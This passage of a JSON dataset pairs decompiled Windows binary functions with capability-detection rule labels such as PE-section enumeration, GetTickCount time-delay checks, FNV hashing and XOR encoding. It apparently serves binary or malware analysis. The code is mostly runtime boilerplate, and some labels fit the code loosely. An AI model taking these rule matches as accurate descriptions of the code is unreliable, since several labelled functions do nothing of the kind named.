        "decompiled_code": "\nuint * __fastcall fcn.00404732(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    *(param_1 + 0x32) = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    *(param_1 + 0xc) = 0;\n    param_1[0xe] = 0;\n    *(param_1 + 0xf) = 0;\n    param_1[0x110] = 0;\n    param_1[0x111] = 0;\n    return param_1;\n}\n",
        "token_count": 233
    },
    "00404c55": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.00404c55(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    (**(*in_ECX + 0x18))(arg_8h, CONCAT44(noname_2, arg_ch), arg_14h, arg_18h, arg_1ch, arg_20h);\n    return arg_14h;\n}\n",
        "token_count": 136
    },
    "0040507e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040507e(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.00403120(0);\n    *(extraout_ECX + 0x14) = 0x201;\n    uVar2 = 0;\n    *(extraout_ECX + 0x30) = 0;\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x18) = 6;\n    *(extraout_ECX + 0x1c) = 0;\n    *(extraout_ECX + 0x20) = 0;\n    *(extraout_ECX + 0x24) = 0;\n    *(extraout_ECX + 0x28) = 0;\n    *(extraout_ECX + 0x2c) = 0;\n    fcn.00403350(0, 0);\n    iVar1 = fcn.00402513(8, uVar2);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00404f70(1);\n        *(iVar1 + 4) = uVar2;\n    }\n    *(extraout_ECX + 0x30) = iVar1;\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 371
    },
    "00405ca4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00405ca4(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    *(param_1 + 0xc) = 0;\n    param_1[0xe] = 0;\n    *(param_1 + 0xf) = 0;\n    param_1[0x110] = 0;\n    param_1[0x111] = 0;\n    return param_1;\n}\n",
        "token_count": 219
    },
    "00421290": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl\nfcn.00421290(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uchar auStack108 [8];\n    uchar auStack100 [68];\n    uint uStack32;\n    uint uStack28;\n    uint var_bp_ch;\n    \n    uStack32 = arg_1ch;\n    uStack28 = arg_20h;\n    uVar1 = fcn.004017c1();\n    uVar1 = fcn.00402b08(in_ECX, auStack108, 0x546740, uVar1);\n    uVar1 = fcn.004055b5(auStack100, 0x40, uVar1, arg_1ch);\n    fcn.00403c38(in_ECX, arg_8h, arg_ch, noname_2, arg_14h, arg_18h, auStack100, uVar1);\n    return arg_8h;\n}\n",
        "token_count": 258
    },
    "00421400": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl\nfcn.00421400(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uchar auStack108 [8];\n    uchar auStack100 [68];\n    uint uStack32;\n    uint uStack28;\n    uint var_bp_ch;\n    \n    uStack32 = arg_1ch;\n    uStack28 = arg_20h;\n    uVar1 = fcn.004017c1();\n    uVar1 = fcn.00402b08(in_ECX, auStack108, 0x546743, uVar1);\n    uVar1 = fcn.004055b5(auStack100, 0x40, uVar1, arg_1ch);\n    fcn.00403c38(in_ECX, arg_8h, arg_ch, noname_2, arg_14h, arg_18h, auStack100, uVar1);\n    return arg_8h;\n}\n",
        "token_count": 258
    },
    "004013b1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013b1(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.00404179(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00402f09": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00402f09(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUStatusWord;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x573c4c < 1) {\n        uVar1 = 0;\n        if ((in_FPUStatusWord & 0x3f) != 0) {\n            uVar1 = (in_FPUStatusWord & 1) << 4;\n            if ((in_FPUStatusWord & 4) != 0) {\n                uVar1 = uVar1 | 8;\n            }\n            if ((in_FPUStatusWord & 8) != 0) {\n                uVar1 = uVar1 | 4;\n            }\n            if ((in_FPUStatusWord & 0x10) != 0) {\n                uVar1 = uVar1 | 2;\n            }\n            if ((in_FPUStatusWord & 0x20) != 0) {\n                uVar1 = uVar1 | 1;\n            }\n            if ((in_FPUStatusWord & 2) != 0) {\n                uVar1 = uVar1 | 0x80000;\n            }\n        }\n    }\n    else {\n        uVar1 = 0;\n        uVar2 = 0;\n        if ((in_FPUStatusWord & 0x3f) != 0) {\n            uVar2 = (in_FPUStatusWord & 1) << 4;\n            if ((in_FPUStatusWord & 4) != 0) {\n                uVar2 = uVar2 | 8;\n            }\n            if ((in_FPUStatusWord & 8) != 0) {\n                uVar2 = uVar2 | 4;\n            }\n            if ((in_FPUStatusWord & 0x10) != 0) {\n                uVar2 = uVar2 | 2;\n            }\n            if ((in_FPUStatusWord & 0x20) != 0) {\n                uVar2 = uVar2 | 1;\n            }\n            if ((in_FPUStatusWord & 2) != 0) {\n                uVar2 = uVar2 | 0x80000;\n            }\n        }\n        if ((in_MXCSR & 0x3f) != 0) {\n            uVar1 = (in_MXCSR & 1) << 4;\n            if ((in_MXCSR & 4) != 0) {\n                uVar1 = uVar1 | 8;\n            }\n            if ((in_MXCSR & 8) != 0) {\n                uVar1 = uVar1 | 4;\n            }\n            if ((in_MXCSR & 0x10) != 0) {\n                uVar1 = uVar1 | 2;\n            }\n            if ((in_MXCSR & 0x20) != 0) {\n                uVar1 = uVar1 | 1;\n            }\n            if ((in_MXCSR & 2) != 0) {\n                uVar1 = uVar1 | 0x80000;\n            }\n        }\n        uVar1 = uVar1 | uVar2;\n    }\n    return uVar1;\n}\n",
        "token_count": 736
    },
    "004032fb": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004032fb(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            pcVar1 = *(arg_ch + -4);\n            if (pcVar1 != NULL) {\n                (**0x578000)(0);\n                (*pcVar1)();\n            }\n            arg_ch = arg_ch + -8;\n        } while (arg_ch != arg_8h);\n    }\n    return 1;\n}\n",
        "token_count": 117
    },
    "004035c6": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004035c6(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    iVar3 = arg_8h - arg_10h;\n    iVar6 = (arg_ch - arg_14h) - (arg_8h < arg_10h);\n    uVar1 = 0;\n    iVar2 = 1;\n    if ((0 < arg_ch) || (iVar4 = iVar2,  -1 < arg_ch)) {\n        iVar4 = 0;\n    }\n    if ((0 < arg_14h) || (iVar5 = iVar2,  -1 < arg_14h)) {\n        iVar5 = 0;\n    }\n    if (iVar4 != iVar5) {\n        if ((0 < arg_ch) || (iVar4 = iVar2,  -1 < arg_ch)) {\n            iVar4 = 0;\n        }\n        if ((0 < iVar6) || (-1 < iVar6)) {\n            iVar2 = 0;\n        }\n        if (iVar4 != iVar2) {\n            iVar3 = -1;\n            uVar1 = 0x80070216;\n            iVar6 = -1;\n        }\n    }\n    *arg_18h = iVar3;\n    arg_18h[1] = iVar6;\n    return uVar1;\n}\n",
        "token_count": 354
    },
    "00403828": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403828(int32_t *param_1)\n\n{\n    int32_t *arg_8h;\n    \n    if ((*param_1 != 0) && (arg_8h = *param_1 + -8,  *arg_8h == 0xdddd)) {\n        fcn.00404179(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00402b53": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.00402b53(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *in_ECX;\n    uint var_bp_ch;\n    \n    (**(*in_ECX + 0x24))(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 88
    },
    "004047d2": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004047d2(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    int32_t in_ECX;\n    \n    uVar1 = *(in_ECX + 0x20);\n    *(in_ECX + 0x20) = CONCAT44(arg_ch, arg_8h);\n    return uVar1;\n}\n",
        "token_count": 81
    },
    "0040534e": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.0040534e(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "004028ec": {
        "rules": [
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004028ec(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_10h != 0) {\n        do {\n            arg_8h = (*(uVar1 + arg_ch) ^ arg_8h) * 0x1000193;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 130
    },
    "0040545c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040545c(uint dwMilliseconds)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = *0x573c08;\n    if (*0x573c08 == NULL) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x573bf0);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObjectEx)(*0x573bec, dwMilliseconds, 0);\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x573bf0);\n    }\n    else {\n        (**0x578000)(0x573be8, 0x573bf0, dwMilliseconds);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004e1a0d": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.004e1a0d(void)\n\n{\n    *0x572930 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00401483": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401483(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t arg_ch;\n    \n    arg_ch = 0;\n    iVar1 = *arg_8h;\n    piVar2 = arg_8h;\n    while (iVar1 != 0) {\n        piVar2 = piVar2 + 1;\n        arg_ch = arg_ch + 1;\n        iVar1 = *piVar2;\n    }\n    fcn.0040467e(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 134
    },
    "004014b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014b0(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00401dd4(arg_18h);\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 131
    },
    "00401596": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00401596(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (param_1 < 0xffffffe1) {\n        if (param_1 == 0) {\n            param_1 = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5755b8, 0, param_1);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.004048fe();\n        } while ((iVar1 != 0) && (iVar1 = fcn.0040417e(param_1),  iVar1 != 0));\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 193
    },
    "00401de8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401de8(void)\n\n{\n    uchar *in_EAX;\n    uint *puVar1;\n    uint *puVar2;\n    uint unaff_retaddr;\n    uchar auStack4 [4];\n    \n    puVar2 = &stack0x00000000 - in_EAX & ~-(*0x10 < in_EAX);\n    for (puVar1 = auStack4 & 0xfffff000; puVar2 < puVar1; puVar1 = puVar1 + -0x400) {\n    }\n    *puVar2 = unaff_retaddr;\n    return;\n}\n",
        "token_count": 133
    },
    "00402572": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402572(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint16_t *arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00406488(*arg_18h);\n            arg_18h = arg_18h + 1;\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 147
    },
    "00402766": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00402766(uint8_t *param_1, uint32_t param_2, uint32_t *param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    \n    if (param_1 == NULL) {\n        param_2 = 0;\n    }\n    else {\n        if (param_2 != 0) {\n            if ((param_2 & 0xffffff80) == 0) {\n                *param_1 = param_2;\n                return 1;\n            }\n            if ((param_2 & 0xfffff800) == 0) {\n                uVar3 = 0xc0;\n                iVar4 = 1;\n                iVar2 = iVar4;\n            }\n            else if ((param_2 & 0xffff0000) == 0) {\n                if ((0xd7ff < param_2) && (param_2 < 0xe000)) {\ncode_r0x004d8ef5:\n                    iVar2 = fcn.00402617(param_3);\n                    return iVar2;\n                }\n                iVar4 = 2;\n                uVar3 = 0xe0;\n                iVar2 = iVar4;\n            }\n            else {\n                if (((param_2 & 0xffe00000) != 0) || (0x10ffff < param_2)) goto code_r0x004d8ef5;\n                iVar4 = 3;\n                uVar3 = 0xf0;\n                iVar2 = iVar4;\n            }\n            do {\n                uVar1 = param_2;\n                param_2 = param_2 >> 6;\n                param_1[iVar4] = uVar1 & 0x3f | 0x80;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            *param_1 = param_2 | uVar3;\n            *param_3 = 0;\n            param_3[1] = 0;\n            return iVar2 + 1;\n        }\n        *param_1 = param_2;\n    }\n    *param_3 = param_2;\n    param_3[1] = param_2;\n    return 1;\n}\n",
        "token_count": 497
    },
    "00402ebe": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ebe(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    fcn.0040620d(2);\n    uVar2 = 1;\n    *(arg_8h + 8) = 1;\n    do {\n        iVar1 = *(uVar2 * 4 + 0x574250);\n        if ((iVar1 == 0) || (iVar1 == arg_8h)) break;\n        uVar2 = uVar2 + 1;\n        *(arg_8h + 8) = uVar2;\n    } while (uVar2 < 8);\n    *(uVar2 + 0x574278) = *(uVar2 + 0x574278) + '\\x01';\n    *(uVar2 * 4 + 0x574250) = arg_8h;\n    fcn.004036f2();\n    return;\n}\n",
        "token_count": 219
    },
    "00403044": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403044(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00402b26();\n    piVar1 = *(iVar2 + 0x24);\n    while( true ) {\n        if (piVar1 == NULL) {\n            return 1;\n        }\n        if (*piVar1 == arg_8h) break;\n        piVar1 = piVar1[1];\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "004032f6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004032f6(char *arg_8h, char **arg_ch)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    char cVar3;\n    \n    uVar2 = 0;\n    iVar1 = 0;\n    cVar3 = *arg_8h;\n    do {\n        if ((cVar3 != \"IND)ind)S\"[iVar1]) && (cVar3 != \"IND)ind)S\"[iVar1 + 4])) goto code_r0x004b656a;\n        cVar3 = **arg_ch;\n        in_EAX = *arg_ch + 1;\n        iVar1 = iVar1 + 1;\n        *arg_ch = in_EAX;\n        *arg_8h = cVar3;\n    } while (iVar1 != 4);\n    uVar2 = 1;\ncode_r0x004b656a:\n    return in_EAX & 0xffffff00 | uVar2;\n}\n",
        "token_count": 224
    },
    "004033dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004033dc(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_8h;\n    \n    if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {\n        arg_8h = param_1 * param_2;\n        if (arg_8h == 0) {\n            arg_8h = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5755b8, 8, arg_8h);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.004048fe();\n        } while ((iVar1 != 0) && (iVar1 = fcn.0040417e(arg_8h),  iVar1 != 0));\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 240
    },
    "00403706": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00403706(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (param_1 == 0) {\n        iVar1 = fcn.0040409d(param_2);\n    }\n    else {\n        if (param_2 == 0) {\n            fcn.0040640b(param_1);\n        }\n        else {\n            if (param_2 < 0xffffffe1) {\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x5755b8, 0, param_1, param_2);\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                    iVar1 = fcn.004048fe();\n                } while ((iVar1 != 0) && (iVar1 = fcn.0040417e(param_2),  iVar1 != 0));\n            }\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0xc;\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 254
    },
    "00403977": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403977(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            piVar3 = arg_8h;\n            do {\n                iVar1 = *((arg_10h - arg_8h) + piVar3);\n                *piVar3 = iVar1;\n                piVar3 = piVar3 + 1;\n                if (iVar1 == 0) break;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                return 0;\n            }\n            *arg_8h = 0;\n            puVar2 = fcn.00403a35();\n            uVar4 = 0x22;\n            goto code_r0x004c8b29;\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.00403a35();\n    uVar4 = 0x16;\ncode_r0x004c8b29:\n    *puVar2 = uVar4;\n    fcn.004037ce();\n    return uVar4;\n}\n",
        "token_count": 314
    },
    "0040409d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040409d(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (arg_8h < 0xffffffe1) {\n        if (arg_8h == 0) {\n            arg_8h = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5755b8, 0, arg_8h);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.004048fe();\n        } while ((iVar1 != 0) && (iVar1 = fcn.0040417e(arg_8h),  iVar1 != 0));\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 202
    },
    "0040443a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040443a(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (arg_8h == 0) {\n        iVar1 = fcn.0040409d(arg_ch);\n    }\n    else {\n        if (arg_ch == 0) {\n            fcn.0040640b(arg_8h);\n        }\n        else {\n            if (arg_ch < 0xffffffe1) {\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x5755b8, 0, arg_8h, arg_ch);\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                    iVar1 = fcn.004048fe();\n                } while ((iVar1 != 0) && (iVar1 = fcn.0040417e(arg_ch),  iVar1 != 0));\n            }\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0xc;\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 255
    },
    "00404453": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404453(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t unaff_EBP;\n    uint32_t uVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00403120(8);\n    fcn.0040620d(0);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    uVar2 = *(unaff_EBP + 0x10);\n    if (*(iVar1 + 0xc) < uVar2 || *(iVar1 + 0xc) == uVar2) {\n        uVar7 = uVar2 + 1;\n        if (uVar7 < 0x28) {\n            uVar7 = 0x28;\n        }\n        iVar5 = fcn.00403706(*(iVar1 + 8), uVar7 << 2);\n        if (iVar5 == 0) {\n            fcn.00401096();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        *(iVar1 + 8) = iVar5;\n        while (*(iVar1 + 0xc) < uVar7) {\n            *(*(iVar1 + 8) + *(iVar1 + 0xc) * 4) = 0;\n            *(iVar1 + 0xc) = *(iVar1 + 0xc) + 1;\n        }\n    }\n    pcVar3 = *(**(unaff_EBP + 0xc) + 4);\n    (**0x578000)();\n    (*pcVar3)();\n    piVar4 = *(*(iVar1 + 8) + uVar2 * 4);\n    *(unaff_EBP + -0x10) = piVar4;\n    if (piVar4 != NULL) {\n        pcVar3 = *(*piVar4 + 8);\n        (**0x578000)();\n        puVar6 = (*pcVar3)();\n        *(unaff_EBP + -0x10) = puVar6;\n        if (puVar6 != NULL) {\n            pcVar3 = **puVar6;\n            (**0x578000)(1);\n            (*pcVar3)();\n        }\n    }\n    *(*(iVar1 + 8) + uVar2 * 4) = *(unaff_EBP + 0xc);\n    fcn.004036f2();\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 616
    },
    "00404d13": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d13(uint *arg_8h, uint8_t *arg_ch, uint8_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    for (; arg_ch != arg_10h; arg_ch = arg_ch + 1) {\n        fcn.00406776(*arg_ch);\n    }\n    *arg_8h = arg_14h;\n    arg_8h[1] = arg_18h;\n    return;\n}\n",
        "token_count": 111
    },
    "00404eb2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404eb2(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint16_t *arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00401dd4(*arg_18h);\n            arg_18h = arg_18h + 1;\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 149
    },
    "00405051": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00405051(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x574440 != 0) {\n        iVar2 = *0x574440 * 0x18 + 0x574410;\n        iVar1 = *0x574440;\n        do {\n            (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(iVar2);\n            *0x574440 = *0x574440 + -1;\n            iVar2 = iVar2 + -0x18;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 1;\n}\n",
        "token_count": 143
    },
    "00405088": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405088(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_8h_00;\n    \n    if ((arg_8h == 0) || (arg_ch <= 0xffffffe0 / arg_8h)) {\n        arg_8h_00 = arg_8h * arg_ch;\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5755b8, 8, arg_8h_00);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.004048fe();\n        } while ((iVar1 != 0) && (iVar1 = fcn.0040417e(arg_8h_00),  iVar1 != 0));\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 255
    },
    "0040560f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00413312)\n// WARNING: Removing unreachable block (ram,0x00413398)\n// WARNING: Removing unreachable block (ram,0x00413350)\n\nuint fcn.0040560f(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puStackY10712;\n    uchar uStackY10692;\n    uchar uStackY10691;\n    uchar uStackY10690;\n    uchar uStackY10689;\n    uchar auStackY10688 [12];\n    uchar uStackY10676;\n    char cStackY10675;\n    char cStackY10674;\n    char cStackY10673;\n    uint uStackY10672;\n    uint uStackY10668;\n    uint *puStackY10660;\n    uint uStackY10656;\n    uint *puStackY10652;\n    uint *puStackY10648;\n    uchar uStackY10641;\n    uint uStackY10640;\n    uchar uStackY10633;\n    uint uStackY10632;\n    uchar uStackY10625;\n    uint uStackY10624;\n    uchar uStackY10617;\n    uint uStackY10616;\n    uint32_t uStackY10612;\n    uint32_t uStackY10608;\n    uint32_t uStackY10604;\n    uint8_t uStackY10598;\n    uint8_t uStackY10597;\n    uint *puStackY10596;\n    uint *puStackY10592;\n    int32_t 